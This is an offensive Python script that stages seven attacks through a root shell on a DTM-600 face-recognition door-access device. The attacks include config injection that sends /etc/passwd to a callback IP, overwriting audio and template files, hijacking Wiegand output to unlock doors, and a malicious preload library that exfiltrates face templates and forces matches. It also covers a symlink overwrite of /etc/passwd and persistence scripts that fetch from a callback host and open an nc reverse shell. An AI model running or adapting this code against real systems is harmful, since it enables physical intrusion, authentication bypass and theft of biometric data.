#!/usr/bin/env python3
"""
Second-Order Attack Staging for DTM-600

Concept: Stage payloads via root access or web upload that are triggered
when YOUR face is recognized (or any face match occurs).

Attack flow:
1. Stage payload via root shell or LAPI
2. Present your enrolled face to camera
3. Recognition triggers payload execution

Requires: Root shell access (nc 192.168.30.178 2323)
"""

import socket
import time
import base64
import json

TARGET = "192.168.30.178"
SHELL_PORT = 2323

class ShellSession:
    """Manage shell session for payload staging"""

    def __init__(self, target=TARGET, port=SHELL_PORT):
        self.target = target
        self.port = port
        self.sock = None

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)
        self.sock.connect((self.target, self.port))
        time.sleep(0.5)
        self.sock.recv(4096)  # Clear banner
        return self

    def execute(self, cmd):
        self.sock.send(f"{cmd}\n".encode())
        time.sleep(1)
        return self.sock.recv(8192).decode('utf-8', errors='ignore')

    def close(self):
        if self.sock:
            self.sock.close()


class SecondOrderAttacks:
    """Second-order attack payloads triggered by face recognition"""

    def __init__(self, shell):
        self.shell = shell

    # =========================================================================
    # ATTACK 1: Config Injection
    # Modify config so successful face match triggers command execution
    # =========================================================================

    def stage_config_injection(self, callback_ip):
        """
        Inject malicious callback into config that triggers on face match.

        Target: config_a.xml or runtime config
        Trigger: Face recognition success event
        """

        # Check if we can modify config
        result = self.shell.execute("ls -la /app/config/")
        print(f"[*] Config directory:\n{result}")

        # Backup original
        self.shell.execute("cp /app/config/config_a.xml /tmp/config_backup.xml")

        # Inject callback URL with command injection
        # Many devices call external URLs on events
        payload = f"http://{callback_ip}/$(cat /etc/passwd | base64)"

        # Look for callback/webhook settings
        result = self.shell.execute("grep -i 'url\\|callback\\|webhook\\|http' /app/config/*.xml | head -20")
        print(f"[*] URL/callback references:\n{result}")

        return result

    # =========================================================================
    # ATTACK 2: Face Template Poisoning
    # Modify enrolled template so match triggers memory corruption
    # =========================================================================

    def stage_template_poison(self):
        """
        Poison face template in database.

        Target: /data/facedb/ templates
        Trigger: Template comparison during recognition

        Attack vector: Overflow in 256-dim feature vector comparison
        """

        # Examine template storage
        result = self.shell.execute("ls -la /data/facedb/ 2>/dev/null || ls -la /app/data/facedb/")
        print(f"[*] Face database:\n{result}")

        result = self.shell.execute("file /data/facedb/* 2>/dev/null | head -10")
        print(f"[*] Template file types:\n{result}")

        # Look at template structure
        result = self.shell.execute("xxd /data/facedb/*.db 2>/dev/null | head -50")
        print(f"[*] Template hex dump:\n{result}")

        # Create poisoned template with overflow values
        poison_template = b'\xff' * 256 * 4  # 256 floats, all 0xffffffff

        # Write to temp
        b64_poison = base64.b64encode(poison_template).decode()
        self.shell.execute(f"echo '{b64_poison}' | base64 -d > /tmp/poison_template.bin")

        print("[*] Poisoned template staged at /tmp/poison_template.bin")
        print("[*] Manual step: Replace active template with poisoned version")

        return True

    # =========================================================================
    # ATTACK 3: Audio Payload
    # Replace success audio with payload that exploits audio decoder
    # =========================================================================

    def stage_audio_payload(self):
        """
        Replace success audio with malformed PCM.

        Target: /app/PcmSource/Access.pcm (played on successful recognition)
        Trigger: Your face is recognized

        Attack: Buffer overflow in PCM playback
        """

        # Check audio files
        result = self.shell.execute("ls -la /app/PcmSource/")
        print(f"[*] Audio files:\n{result}")

        result = self.shell.execute("file /app/PcmSource/*.pcm | head -10")
        print(f"[*] Audio file types:\n{result}")

        # Backup original
        self.shell.execute("cp /app/PcmSource/Access.pcm /tmp/Access.pcm.bak")

        # Create malformed PCM with oversized header
        # PCM is typically raw, but if there's any header parsing...
        malformed_pcm = b'\xff\xff\xff\xff' * 1000  # Max values
        malformed_pcm += b'\x00' * 10000  # Padding

        b64_pcm = base64.b64encode(malformed_pcm).decode()
        self.shell.execute(f"echo '{b64_pcm}' | base64 -d > /app/PcmSource/Access.pcm")

        print("[+] Malformed audio staged at /app/PcmSource/Access.pcm")
        print("[*] Trigger: Present your face for recognition")

        return True

    # =========================================================================
    # ATTACK 4: Wiegand Output Hijack
    # Modify Wiegand output to send arbitrary data on face match
    # =========================================================================

    def stage_wiegand_hijack(self):
        """
        Modify Wiegand output handler.

        Target: Wiegand output on successful recognition
        Effect: Send arbitrary card data to door controller

        This could unlock doors with spoofed credentials.
        """

        # Check Wiegand module
        result = self.shell.execute("lsmod | grep wieg")
        print(f"[*] Wiegand modules:\n{result}")

        result = self.shell.execute("ls -la /app/lib/modules/*.ko")
        print(f"[*] Kernel modules:\n{result}")

        # Check for Wiegand config
        result = self.shell.execute("grep -i wiegand /app/config/*.xml")
        print(f"[*] Wiegand config:\n{result}")

        # Look for card number mapping
        result = self.shell.execute("grep -i 'cardno\\|wiegand\\|output' /app/config/*.xml | head -20")
        print(f"[*] Card output settings:\n{result}")

        return result

    # =========================================================================
    # ATTACK 5: Library Preload
    # Inject shared library that hooks face recognition functions
    # =========================================================================

    def stage_library_injection(self, callback_ip):
        """
        Create malicious .so that intercepts face recognition.

        Target: LD_PRELOAD or library path injection
        Trigger: Any face recognition attempt

        Effect: Exfiltrate face data, bypass authentication
        """

        # Check library path
        result = self.shell.execute("echo $LD_LIBRARY_PATH")
        print(f"[*] Library path: {result}")

        result = self.shell.execute("cat /etc/ld.so.conf 2>/dev/null")
        print(f"[*] ld.so.conf: {result}")

        # Check if we can write to lib paths
        result = self.shell.execute("ls -la /app/lib/")
        print(f"[*] /app/lib/ permissions:\n{result}")

        # Check for preload
        result = self.shell.execute("cat /etc/ld.so.preload 2>/dev/null || echo 'No preload file'")
        print(f"[*] Preload: {result}")

        # Malicious library source (conceptual - would need cross-compile)
        source = f'''
// evil.c - compile with arm-linux-gnueabihf-gcc -shared -fPIC -o evil.so evil.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// Hook face comparison function
// Intercept and always return match
int face_compare_hook(void* template1, void* template2, float* score) {{
    // Exfiltrate template
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    inet_pton(AF_INET, "{callback_ip}", &addr.sin_addr);
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    send(sock, template1, 256*4, 0);  // 256 floats
    close(sock);

    *score = 1.0;  // Always match
    return 1;
}}

// Constructor - runs when library loads
__attribute__((constructor))
void init() {{
    system("echo 'PWNED' > /tmp/pwned.txt");
    // Could also: reverse shell, modify config, etc.
}}
'''
        print("[*] Malicious library source:")
        print(source)
        print("\n[*] To deploy:")
        print("    1. Cross-compile: arm-linux-gnueabihf-gcc -shared -fPIC -o evil.so evil.c")
        print("    2. Upload: nc upload or via web")
        print("    3. Create preload: echo '/tmp/evil.so' > /etc/ld.so.preload")
        print("    4. Restart mwareserver or wait for reboot")

        return source

    # =========================================================================
    # ATTACK 6: Symlink Attack on Face Log
    # Symlink face log to sensitive file, face match writes to it
    # =========================================================================

    def stage_symlink_attack(self):
        """
        Symlink face recognition log to sensitive file.

        Target: /data/log/face.log or similar
        Trigger: Face recognition logs person name/ID

        Effect: Overwrite /etc/passwd, config, etc.
        """

        # Find log files
        result = self.shell.execute("ls -la /data/log/ 2>/dev/null")
        print(f"[*] Log directory:\n{result}")

        result = self.shell.execute("ls -la /app/log/ 2>/dev/null")
        print(f"[*] App log directory:\n{result}")

        # Check what gets logged on recognition
        result = self.shell.execute("grep -r 'log\\|Log\\|LOG' /app/config/*.xml | grep -i face | head -10")
        print(f"[*] Face logging config:\n{result}")

        # Find writable logs
        result = self.shell.execute("find /data /app -name '*.log' -writable 2>/dev/null | head -10")
        print(f"[*] Writable logs:\n{result}")

        print("\n[*] Symlink attack steps:")
        print("    1. Identify log written on face match")
        print("    2. rm /data/log/face.log")
        print("    3. ln -s /etc/passwd /data/log/face.log")
        print("    4. Enroll user with name containing passwd entry")
        print("    5. Face match writes malicious entry to /etc/passwd")

        return True

    # =========================================================================
    # ATTACK 7: Cron/Init Persistence Triggered by Face
    # =========================================================================

    def stage_cron_persistence(self, callback_ip):
        """
        Create cron job triggered by face recognition event.

        Uses inotify or polling on recognition success indicator.
        """

        # Check for cron
        result = self.shell.execute("ls -la /etc/cron* /var/spool/cron* 2>/dev/null")
        print(f"[*] Cron directories:\n{result}")

        # Check for init scripts
        result = self.shell.execute("ls -la /etc/init.d/ /etc/rc.local 2>/dev/null")
        print(f"[*] Init scripts:\n{result}")

        # Create watcher script
        watcher_script = f'''#!/bin/sh
# Watch for face recognition success
# Triggered by: access log update, GPIO change, etc.

LOGFILE="/data/log/access.log"
LASTSIZE=0

while true; do
    CURSIZE=$(stat -c%s $LOGFILE 2>/dev/null || echo 0)
    if [ "$CURSIZE" -gt "$LASTSIZE" ]; then
        # New recognition event!
        # Check if it's YOUR face (match your enrolled ID)
        if tail -1 $LOGFILE | grep -q "YOUR_PERSON_ID"; then
            # PAYLOAD TRIGGERED
            wget -q -O- http://{callback_ip}/triggered &
            # Or: reverse shell, data exfil, etc.
        fi
        LASTSIZE=$CURSIZE
    fi
    sleep 1
done
'''
        print("[*] Face-triggered watcher script:")
        print(watcher_script)

        # Alternative: Use inotifywait if available
        inotify_script = f'''#!/bin/sh
# inotify-based trigger
inotifywait -m /data/log/access.log -e modify |
while read path action file; do
    tail -1 /data/log/access.log | grep -q "YOUR_ID" && \\
        nc {callback_ip} 4444 -e /bin/sh
done
'''
        print("\n[*] Alternative inotify script:")
        print(inotify_script)

        return True


def run_recon(shell):
    """Run reconnaissance before staging attacks"""
    print("=" * 60)
    print("SECOND-ORDER ATTACK RECON")
    print("=" * 60)

    checks = [
        ("Processes", "ps aux"),
        ("Open files", "lsof 2>/dev/null | head -50 || ls -la /proc/$(pidof mwareserver)/fd/"),
        ("Network listeners", "netstat -tlnp 2>/dev/null || ss -tlnp"),
        ("Writeable dirs", "find / -writable -type d 2>/dev/null | grep -v proc | head -20"),
        ("SUID binaries", "find / -perm -4000 2>/dev/null | head -20"),
        ("Config files", "find /app /data -name '*.xml' -o -name '*.conf' -o -name '*.json' 2>/dev/null | head -30"),
        ("Face database", "find / -name '*face*' -o -name '*template*' 2>/dev/null | head -20"),
    ]

    for name, cmd in checks:
        print(f"\n[*] {name}:")
        print("-" * 40)
        result = shell.execute(cmd)
        print(result[:2000])


def main():
    print("[*] DTM-600 Second-Order Attack Staging")
    print("[*] Connecting to device...")

    try:
        shell = ShellSession().connect()
        print("[+] Connected to root shell")
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        print("[!] Make sure device is on and accessible")
        return

    # Run recon
    run_recon(shell)

    # Initialize attack module
    attacks = SecondOrderAttacks(shell)

    print("\n" + "=" * 60)
    print("AVAILABLE SECOND-ORDER ATTACKS")
    print("=" * 60)

    attack_menu = [
        ("1", "Config Injection", attacks.stage_config_injection),
        ("2", "Template Poisoning", attacks.stage_template_poison),
        ("3", "Audio Payload", attacks.stage_audio_payload),
        ("4", "Wiegand Hijack", attacks.stage_wiegand_hijack),
        ("5", "Library Injection", attacks.stage_library_injection),
        ("6", "Symlink Attack", attacks.stage_symlink_attack),
        ("7", "Cron Persistence", attacks.stage_cron_persistence),
    ]

    for num, name, _ in attack_menu:
        print(f"  [{num}] {name}")

    print("\n[*] Run individual attacks or modify for your callback IP")
    print("[*] Example: attacks.stage_library_injection('192.168.30.1')")

    shell.close()


if __name__ == '__main__':
    main()
